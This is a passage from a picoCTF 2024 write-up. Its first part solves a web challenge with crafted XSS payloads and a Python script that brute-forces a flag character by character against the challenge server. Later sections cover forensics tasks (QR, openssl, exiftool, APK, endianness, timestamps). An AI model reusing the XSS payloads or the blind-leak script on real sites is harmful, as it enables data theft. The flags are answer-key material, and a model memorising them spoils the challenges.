This is more of a conditional statement, if the pathname is ```/``` the ```content-type``` header is set to ```text/html```, if the pathname is ```/index.js``` the ```content-type``` is set to ```text/javascript```. Lastly, if the pathname is ```/remoteCraft```, the code parses a URL search parameter named recipe and extracting two variables, "recipe" and "xss". It then performs several assertions to validate the input:
```
assert(typeof xss === 'string'): This checks that xss is a string.
assert(xss.length < 300): This checks that the length of xss is less than 300 characters.
assert(recipe instanceof Array): This checks that recipe is an array.
assert(recipe.length < 50): This checks that the length of recipe is less than 50.
for (const step of recipe) { ... }: This iterates over each element in the recipe array.
assert(step instanceof Array): This checks that each element in the recipe array is an array.
assert(step.length === 2): This checks that each element in the recipe array has a length of 2.
for (const element of step) { ... }: This iterates over each element in the current step array.
assert(typeof xss === 'string'): This checks that the current element is a string.
assert(element.length < 50): This checks that the length of the current element is less than 50 characters.
```
Now, when all these conditions are met we get a message that says ```visiting```, if the conditions aren't met, then we get the ```invalid recipe``` message. 

Well, the recipes are stored in the ```index.js``` file 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/685f2c3f-1746-4b7e-8dc9-dcf9be43a138)

Lets analyze this script

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/726a2268-a2ec-4b3e-b530-b91cb5ef44e2)

So we have the recipe and the elements array

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/329d60ef-40e5-4897-9dba-a7dafe0ce2e0)

This script defines a function called evaluate that takes any number of arguments and checks if they match a recipe in an array. If the first and second arguments match ing equal to 'XSS', the script evaluates the xssproperty of thestateobject as a JavaScript expression using theevalfunction. If theresultis not equal to'XSS', the function simply returns the result.

Now that we've seen what the scripts are doing lets start the docker instance

You can run the ```index.mjs``` script using node

command:```node index.mjs```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/86ae901f-54c4-4ae3-a4ca-2880eabc9d4f)

We can navigate to the url ```http://127.0.0.1:8080``` on the chromum browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4dba8e71-201e-4e00-abd8-653daa7a1c85)

We have 4 elements here, what happens when we mix fire and water??

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/21a5bc9d-3e3e-42da-bdce-3a92f4d6189e)

So ```fire + water = steam```, how about air and water??

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/43c2f1c6-efae-4e7f-a78d-5cb3be21f6de)

So, ```air + water = mist```, now this means those 4 elements are the base recipes, so it's safe to say every other recipes are being formed from these base recipes. Now, if you check the index.js file you'll see that the ```xss = exploit + web design```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ddc39305-8f1f-4cc9-aff4-593ac4c2477f)

But then then ```exploit``` also has recipes it's produced from. So, to get the right recipe we have to get the base recipes right.

When you try to get the base recipes for xss, you should have something like this

```
[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]]
```
Now, we've explained conditions to meet if we want to execute xss, you can check the explanation for this above. So at the end of the day we can craft this payload

```
/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"alert(1)"}
```
So, if the recipes are right we get a message that says "visiting", also our xss query gets executed, but if the recipes aren't right we get an "invalid recipe" message

Lets try this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d22ca00c-91bf-493d-a15e-8594f3363c80)

The moment we got the "visiting" message, another chromium instance popped up executing the xss query.

Now, the question is, how do we exfiltrate data with this??

I mean this was the part where nyself and my teammates got stuck. We thought of webrtc, but then webrtc was disabled on the chromium browser so that wasn't possible. We could have used the ```fetch()``` function though but we can't because of the ```connect-src``` in the csp header which limits the domian we connect to or websockets. We were stuck here for days trying to bypass csp hehe

But then we tried something else, how about instead of trying to exfiltrate all the data at once we kind of just check the server for each characters and then we try to make an event happen if the character is present. 

If you are familiar with Blind SQL injection with conditional responses you'll understand what I'm trying to say, for Blind SQL injection you get a response when your query is true. We'll be using the same approach here.

Lets craft a payload like this

```
/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"if (JSON.parse(atob(window.location.hash.slice(1))).flag[0] == 'p'){alert(1);}"}
```
Now, what this does is that, if the recipes are correct it gives us the "visiting" message and then spawns another chromium instance, if the first character of the flag property in the json object is "p" is present the ```alert``` statement gets executed, if the first character isn't "p", the ```alert``` statement doesn't get executed

Lets try this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bda0e5e8-fe20-4b46-904e-e4d59940d3b3)

The alert statement got executed which means the character "p" is the first character, lets change the character to say "Q"

```
/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"if (JSON.parse(atob(window.location.hash.slice(1))).flag[0] == 'q'){alert(1);}"}
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/148f299b-a6ac-4cbf-a6ef-fd8f0fefb863)

Well, the alert statement didn't get executed which means the character "q" isn't the first character of the flag propert

It was easier to test this method here since we know  the fake flag to be ```picoCTF{test_flag}```, so you can confirm if these characters are in the flag property using that query. From the fake flag we know the 10th index in the flag property has the "s" character, lets confirm this with our query

```
/remoteCraft?recipe={"recipe":[["Air","Water"],["Air","Earth"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fire","Mud"],["Magma","Mist"],["Earth","Obsidian"],["Air","Rock"],["Fog","Mud"],["Brick","Fog"],["Obsidian","Water"],["Computer Chip","Hot Spring"],["Computer Chip","Fire"],["Hot Spring","Sludge"],["Internet","Smart Thermostat"],["Computer Chip","Steam Engine"],["Fire","Steam Engine"],["Hot Spring","Steam Engine"],["Artificial Intelligence","Data"],["Artificial Intelligence","Cloud"],["Computer Chip","Electricity"],["Dust","Heat Engine"],["Software","Encryption"],["Cloud Computing","Data"],["Fire","Sand"],["Electricity","Software"],["Internet","Program"],["Artificial Intelligence","Data Mining"],["Glass","Software"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"if (JSON.parse(atob(window.location.hash.slice(1))).flag[10] == 's'){alert(1);}"}
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/25f57128-b970-4550-a46a-6b435f3198f0)

Yeah, the query works😎

Now, how do we test this on the challenge instance??

The challenge instance doesn't spawn a chromium browser even if our recipe is correct, all we get is just the "visiting" message. So in this case we won't be able to tell if a character is in the flag property or not because we don't know if our alert statement is getting executed or not.

So we came up with something else, my teammate wrote a python script

```python
import requests
import json
import string

def search():
    # binary search algo implementation
    pass

def doxss(xss):
    return json.dumps({
    "recipe": [['Water', 'Earth'], ['Water', 'Air'], ['Mist', 'Fire'], ['Mud', 'Fog'], ['Fire', 'Earth'], ['Magma', 'Mud'], ['Obsidian', 'Water'], ['Sludge', 'Hot Spring'], ['Steam Engine', 'Fire'], ['Earth', 'Air'], ['Heat Engine', 'Dust'], ['Sand', 'Fire'], ['Obsidian', 'Earth'], ['Hot Spring', 'Steam Engine'], ['Computer Chip', 'Electricity'], ['Glass', 'Software'], ['Computer Chip', 'Steam Engine'], ['Computer Chip', 'Fire'], ['Artificial Intelligence', 'Data'], ['Software', 'Encryption'], ['Vulnerability', 'Cybersecurity'], ['Electricity', 'Software'], ['Magma', 'Mist'], ['Rock', 'Air'], ['Program', 'Internet'], ['Exploit', 'Web Design']],
    "xss": xss})

flag = "picoCTF{"
idx = 8
url = 'http://rhea.picoctf.net:64687/remoteCraft'
# url = 'http://rhea.picoctf.net:61582/remoteCraft'

charset = string.printable

while True:
    print(f"Flag: {flag}")
    for string in charset:
        print(f"Trying: {flag + string}")

        isFound = False
        chr = string
        xss = "if (JSON.parse(atob(window.location.hash.slice(1))).flag[" + str(idx) + "] == " + "'" + string + "'" +"){document.body.innerHTML+=`<iframe srcdoc=\"<script src='${location.origin}//'>\"></iframe>`;};"
        print(xss)
        cnt = 0

        while cnt <= 15:
            try:
                full = f"{url}?recipe={requests.utils.quote(doxss(xss))}"
                requests.get(full)    
            except ConnectionRefusedError:
                flag += charset[charset.index(string)-1]
                idx += 1
                cnt = 15
                is_Found = True
                continue

            if isFound:
                break

            cnt += 1
            
        # print(f"[Counter: {cnt}, isFound: {isFound}]")

    if len(flag) != 0 and flag[-1] != '}':
        break
```
This script performs a bruteforce to find the missing character in a flag by sending GET requests to a URL with a parameter 'recipe' set to a JSON object containing an XSS payload. The iframe is being used to trigger a ConnectionRefusedError to determine if the current character being tested is the missing character in the flag. The iframe is being added to the body that contains a script from the same origin as the parent page. This is a technique used in XSS attacks to bypass the same-origin policy and execute scripts from the same origin as the parent page. In this case, the iframe in the flag by triggering a ConnectionRefusedError when the correct character is found. All you have to do is change the url in the script to that of your challenge instance and then run the script

PS: This script requires good internet connection to get accurate results

command:```python bankai.py```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7b6c6d8c-2f56-400c-8930-072a2ccfa8f9)

You can see that the script crashed when it got to the character "l", this means the character "l" is indeed the 8th index of the flag. 

To get the 9th index

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/61cc7d4e-11e9-4c25-98bf-ee1fe50f83fb)

Just edit those 2 variables and run the script again
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4524f648-14e2-4963-889f-c802d1c3ad56)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8db9944b-026a-4c4a-956c-e9fe77e06898)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b3a31214-3255-4c27-bc44-fa41d821cfb3)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0efa1478-16dc-4c97-981a-c91cc84bb6ec)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cb4dff43-bc5b-4ad2-96d5-dc9f71d7c19d)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/85d21e76-ec28-41b0-b666-6a7b79aef4fa)

You'll keep running this until you get to the last character, the flag length is quite long though

FLAG:- ```picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}```





# Forensics

## Scan Surprise (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/617297c0-e5d8-4c8c-a2b1-0ab3b11c3c92)

We actually don't need the challenge instance, just download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e5e0fd5-fe69-42ec-863c-d0e80de7c814)

We have a png image, lets check the content of this image

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2b423eda-847f-4cad-88a9-e61c900e5cb0)

We have this qr code, we can scan this using this [website](https://scanqr.org/)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/18bb57c9-dbe4-4400-8543-065ef11c2979)

We got our flag

FLAG:- ```picoCTF{p33k_@_b00_19eccd10}```

---------------------------------------------

## Verify (50 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/13c2a64e-b7cc-4583-a2e4-d067730e3ccc)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/db6485bb-bec3-4e16-a5d2-f8629a28b8df)

We have a ```checksum.txt``` file and also a ```decrypt.sh``` file. The ```files``` directory contains 100+ files, in these files we have different checksums

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a5dc0a9a-ccc1-4abd-bff5-d6a678beedff)

So we have that particular sha-256 hash, and then we have the openssl command in the "decrypt.sh" file.

First, lets look for the file that has this sha-256 hash ```55b983afdd9d10718f1db3983459efc5cc3f5a66841e2651041e25dec3efd46a```. We can use the grep command for this

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/verify/home/ctf-player/drop-in]
└─$ cd files                                                                             
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/home/ctf-player/drop-in/files]
└─$ sha256sum * | grep "55b983afdd9d10718f1db3983459efc5cc3f5a66841e2651041e25dec3efd46a"
55b983afdd9d10718f1db3983459efc5cc3f5a66841e2651041e25dec3efd46a  2cdcb2de
```
The file ```2cdcb2de``` contains our sha-256 hash. Now, lets use openssl to decrypt this

command:```openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -salt -in files/2cdcb2de -k picoCTF -out encrypted.data```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b625622d-9f96-46ba-ab41-27e3c785eb6c)

Yup, that's our flag

FLAG:- ```picoCTF{trust_but_verify_2cdcb2de}```

-------------------------------------------

## CanYouSee (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ac7dc976-24df-478f-b506-e87b0b33cfbe)

Download the challenge file and unzip

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2c65ca58-e545-40b5-b111-f39ff14998d4)

We've got a jpg image, lets run exiftool on this image

command:```exiftool ukn_reality.jpg```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4ead413c-09c5-4411-97b1-582f0556d28c)

That's a base64 encoded text, lets decode hehe

command:```echo "cGljb0NURntNRTc0RDQ3QV9ISUREM05fNmE5ZjVhYzR9Cg==" | base64 -d```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/canyousee]
└─$ echo "cGljb0NURntNRTc0RDQ3QV9ISUREM05fNmE5ZjVhYzR9Cg==" | base64 -d                                    
picoCTF{ME74D47A_HIDD3N_6a9f5ac4}
```
Nice Nice, we got our flag

FLAG:- ```picoCTF{ME74D47A_HIDD3N_6a9f5ac4}```

---------------------------------------------------------------

## Secret of the Polygot (100 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d0258ab3-dcc4-406f-9d80-ee0b17604e48)

Download the challenge file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6ec15f97-02b0-4e05-9b11-8dc3acfc4929)

We've got a pdf file, lets view the content of this pdf file using a pdf viewer

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2346536c-6a0e-4a7f-afba-def0a26e4eae)

oops. we've only got half of the flag. Should we form the other half ourselves??😂

Well, we don't need to do that. Try using the ```file``` command to check the kind of file that file is

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/secret_of_the_polygot]
└─$ file flag2of2-final.pdf 
flag2of2-final.pdf: PNG image data, 50 x 50, 8-bit/color RGBA, non-interlaced
```
As you can see it is a png image not even a pdf file. What we can do is change the file extension from ```.pdf``` to ```.png```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3477914f-b8a8-433e-9c93-71dd7eaed221)

Yup that's the other half of the flag😎

FLAG:- ```picoCTF{f1u3n7_1n_pn9_&_pdf_1f991f77}```

---------------------------------

## Mob Psycho (200 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/68dd00d8-b3e2-46f8-b19d-ab7d25dbdc18)

Download the APK file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/mob_psycho]
└─$ ls -la
total 4048
drwxr-xr-x 2 bl4ck4non bl4ck4non    4096 Mar 24 15:09 .
drwxr-xr-x 7 bl4ck4non bl4ck4non    4096 Mar 24 15:08 ..
-rw-r--r-- 1 bl4ck4non bl4ck4non 4136368 Mar 24 15:09 mobpsycho.apk
```
We could have extracted this using ```apktool``` but then it won't give us the flag, so lets just unzip

command:```unzip mobpsycho.apk```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/mob_psycho]
└─$ ls -la
total 14148
drwxr-xr-x  4 bl4ck4non bl4ck4non    4096 Mar 24 15:18 .
drwxr-xr-x  7 bl4ck4non bl4ck4non    4096 Mar 24 15:08 ..
-rw-r--r--  1 bl4ck4non bl4ck4non    4056 Jan  1  1981 AndroidManifest.xml
drwxr-xr-x  4 bl4ck4non bl4ck4non    4096 Mar 12 01:06 META-INF
-rw-r--r--  1 bl4ck4non bl4ck4non 9028868 Jan  1  1981 classes.dex
-rw-r--r--  1 bl4ck4non bl4ck4non  463856 Jan  1  1981 classes2.dex
-rw-r--r--  1 bl4ck4non bl4ck4non    3700 Jan  1  1981 classes3.dex
-rw-r--r--  1 bl4ck4non bl4ck4non 4136368 Mar 24 15:09 mobpsycho.apk
drwxr-xr-x 41 bl4ck4non bl4ck4non    4096 Mar 12 01:06 res
-rw-r--r--  1 bl4ck4non bl4ck4non  824736 Jan  1  1981 resources.arsc
```
Well, at this point I started asking myself why the challenge creator gave it the name "Mob Psycho" because it is so unrelated.

To get the flag, try searching for files with the ```.txt``` extensions

command:```find . -type f -name "*.txt"```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/mob_psycho]
└─$ find . -type f -name "*.txt"
./res/color/flag.txt
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/mob_psycho]
└─$ cat res/color/flag.txt 
7069636f4354467b6178386d433052553676655f4e5838356c346178386d436c5f37343664666133397d
```
We get that ciper, using [dcode.fr](https://www.dcode.fr/cipher-identifier) we can determine the kind of cipher this is

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3ae9fc43-e906-44d8-bdf3-1c07a07673a3)

Ascii code, nice. Lets decode

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/50bb346a-f0f2-464b-a94a-41600e333ccd)

Successfully gotten the flag

FLAG:- ```picoCTF{ax8mC0RU6ve_NX85l4ax8mCl_746dfa39}```

---------------------------- 

## endianness-v2 (300 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cdf70bbb-4f60-4470-8caf-e77d148fd639)

Download the challenge file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/endianness-v2]
└─$ ls -la
total 12
drwxr-xr-x  2 bl4ck4non bl4ck4non 4096 Mar 26 13:41 .
drwxr-xr-x 10 bl4ck4non bl4ck4non 4096 Mar 25 17:34 ..
-rw-r--r--  1 bl4ck4non bl4ck4non 3428 Mar 26 13:41 challengefile
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/endianness-v2]
└─$ file challengefile 
challengefile: data
```
Lets view the hex of the challenge file 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9c7dab54-feb1-4dcd-b5b8-7793fd87cf8f)

You'll see that the starting byte for this file resembls that of a jpg file, but then it's actually swapped. Normal starting byte for a jpeg file is ```FF D8 FF E0``` but then from the hex we have this ``` e0ff d8ff```

To correct this, we'll be using this python script

```python
import textwrap

def swap_chunks(data):
    chunks = []
    swapped_data = ""

    for i in range(0, len(data), 4):
        chunks.append(data[i:i+4])

    lt_idx = chunks[-1]
    chunks = chunks[:-1]
    swapped = b""

    for i in range(len(chunks)):
        swapped += chunks[i][::-1]
            

    return swapped

def main():
    input_file = 'challengefile'
    output_file = 'dump'

    with open(input_file, 'rb') as f:
        file_data = f.read()

    swapped_data = swap_chunks(file_data)


    with open(output_file, 'wb') as f:
        f.write(swapped_data)


if __name__ == "__main__":
    main()
```
This script reads binary data from a file named 'challengefile', swaps the order of every four bytes within the data, and then writes the swapped data to a file named 'dump'.

Lets run this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/524f5cb7-5ecc-4c66-ad08-dad105924f53)

We got a jpeg file after running the script. Lets view this image using an image viewer

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/88944030-a049-491f-bc65-7b1882d196bc)

We got our flag

FLAG:- ```picoCTF{cert!f1Ed_iNd!4n_s0rrY_3nDian_94cc03f3}```

------------------------------

## Blast from the Past (300 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c92ba0c6-635f-4416-875d-4eb0065dd2b4)

The task here is to set the timestamps on this jpeg to ```1970:01:01 00:00:00.001+00:00```

Lets download the file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ ls -la
total 2796
drwxr-xr-x 2 bl4ck4non bl4ck4non    4096 Mar 25 05:49 .
drwxr-xr-x 8 bl4ck4non bl4ck4non    4096 Mar 25 05:46 ..
-rw-r--r-- 1 bl4ck4non bl4ck4non 2851929 Mar 25 05:46 original.jpg
```
When you run ```exiftool``` on the image, you'll get this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ecf9655c-1f61-4a9a-bc8b-b071afa88816)

To know the timestamps to specifically edit, lets try to submit the original jpg file. We have 2 instances, one is for submitting the modified jpeg, while the other instance is used for checking the modified jpeg.

Lets try to submit this original jpeg so we know what to edit

command
```
nc -w 2 mimas.picoctf.net 58576 < original.jpg (to submit)
nc mimas.picoctf.net 54978 (to check) (notice how I didn't include the "-d", well it is not needed)
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c4ad7bc5-8bd1-43ae-bc91-f9de5e4e3391)

Lets edit the ```ModifyDate```

command:```exiftool -ModifyDate="1970:01:01 00:00:00" original.jpg```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ exiftool -ModifyDate="1970:01:01 00:00:00" original.jpg
    1 image files updated
```
Good, now lets submit and check the modified jpg file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4bcd63da-e982-41a2-aac5-bdde70b1a09c)

Good, we've completed the first tag, the second tag requires us to modify ```DateTimeOriginal```

Chotto matte, what if instead of editing the timestamps one by one we just edit all at once??

Lets try it

command:```exiftool -AllDates="1970:01:01 00:00:00" original.jpg```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ exiftool -AllDates="1970:01:01 00:00:00" original.jpg  
    1 image files updated
```
Lets submit and check again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9d76f3ff-5ac1-4e4b-acd4-f2b73139d42d)

Good, we jumped right to the 4th tag, to edit the composite ```SubSecCreateDate```

command:```exiftool -SubSecCreateDate="1970:01:01 00:00:00.001" original.jpg```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ exiftool -SubSecCreateDate="1970:01:01 00:00:00.001" original.jpg
    1 image files updated
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/aa54c99d-bf16-440e-8940-1ab2ea709890)

Good, for the 5th tag we have to edit the composite ```SubSecDateTimeOriginal```

command:```exiftool -SubSecDateTimeOriginal="1970:01:01 00:00:00.001" original.jpg```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ exiftool -SubSecDateTimeOriginal="1970:01:01 00:00:00.001" original.jpg
    1 image files updated
```
Lets submit and check the next timestamp to edit

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f77ce06e-f2b2-420e-bb54-32ddbaaacfce)

For the 6th tag we have to edit the composite ```SubSecModifyDate```

command:```exiftool -SubSecModifyDate="1970:01:01 00:00:00.001" original.jpg```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/…/CTF/picoCTF_2024/forensics/blast_from_the_past]
└─$ exiftool -SubSecModifyDate="1970:01:01 00:00:00.001" original.jpg      
    1 image files updated
```
Lets submit and view

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7869d0de-458b-4851-91cf-12253505f06e)

Good, we are now on the 7th tag, well for this 7th tag exiftool didn't really help me out. So I uded a hexeditor "imex". To install you can just run ```sudo apt install imhex```. You actually can use any hexeditor of your choice

We'll edit the jpg file using this, you'll know why soon

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dd0cc829-bc23-4e42-8f5f-7fddaea5886f)

Now, scroll down to the bottom, you'll find something interesting hehe

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/60a6ab13-d09b-4dcd-ba6d-235857b825a7)

From the above screenshot you can see something like this ```Image_UTC_Data1700513181420``` and we know that the 7th tag which is the last one has to do with modifying the samsung timestamp.

Well, the question should be, how does samsung store their timestamp

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4c5d782c-f48f-49ba-b49e-11f4757ef34a)

As we can see samsung stores their timestamp more like in unix timestamps, lets try to convert the unix timestamp we found in the jpeg hex.

unix timestamp:```1700513181420```

We can use this [website](https://www.unixtimestamp.com/) to convert this to a proper date and time

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1d7146e2-2f30-40d7-ab40-ab904e4339a6)

That's the time and date we have on the samsung timestamp, so we have to edit this. Since we know the date we want to edit to which is ```1970:01:01 00:00:00.001+00:00``` we'll just convert this to unix timestamp

Lets do that

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c0dc51d7-5fed-4247-a52d-5fedcd668292)

You can see that the unix timestamp for this date is ```0```, since well'll be using ```GMT+1``` (GMT+1 refers to Greenwich Mean Time plus one hour), we can say our unix timestamp for that given date is ```01``` which in hex is represented as ```30 31```.

Now, this means we'll edit from this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/db4a41ee-fd82-460f-9cc9-5fa01b4cf50c)

To this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bab12d65-be84-4b33-9871-7cdfb293d6c4)

Now lets submit this modified image and check it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4025b1d2-002a-4005-8542-447c6265e71a)

We got our flag hehe😎

FLAG:- ```picoCTF{71m3_7r4v311ng_p1c7ur3_ed953b57}```

----------------------------------

## Dear Diary (400 points)
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/244d460f-0504-493a-b8d1-7e1e1020da87)

Pico has a culture of releasing disk images challs as as part of their forensics chall every year, well this was easier compared to last year's own. Took me less than 30 mins to figure out hehe😎

Lets jump right into it

Dowload the challenge file and extract the disk image

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2ed2e676-84f0-4fde-859c-083c07cd8929)

From the hint provided

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5ccbe6bf-830e-4a31-ae3c-8d262f55760c)

It's so obvious we can't mount the disk image using our terminal, so we'll mount this disk image using autopsy. Autopsy is a tool that comes preinstalled on kali

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed3eb2ed-f6f8-40b2-86f0-44ba927881a8)
